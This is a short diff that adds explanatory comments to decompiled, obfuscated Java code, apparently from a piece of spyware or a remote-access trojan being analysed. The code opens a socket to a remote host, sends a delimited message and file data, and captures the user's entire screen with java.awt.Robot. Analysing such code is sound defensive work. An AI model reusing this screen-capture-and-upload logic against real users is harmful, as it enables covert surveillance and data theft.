@@ -24,6 +24,7 @@ final class j extends Thread {
         this.a = new Socket(this.b, this.c);
         DataOutputStream var3 = new DataOutputStream(this.a.getOutputStream());
         FileInputStream var5 = new FileInputStream(var1);
+        // maybe confirm message to server
         var3.writeBytes(k.g + k.d + k.I + k.d + var2 + k.d + "&&&");
 
         try {
@@ -43,10 +44,12 @@ final class j extends Thread {
     }
 
     public final void run() {
+        // set system property to capture screenshot by java
         System.setProperty("java.awt.headless", "false");
         BufferedImage var1 = null;
 
         try {
+            // get screenshot of user's current whole screen
             var1 = (new Robot()).createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
         } catch (HeadlessException var4) {
             var4.printStackTrace();
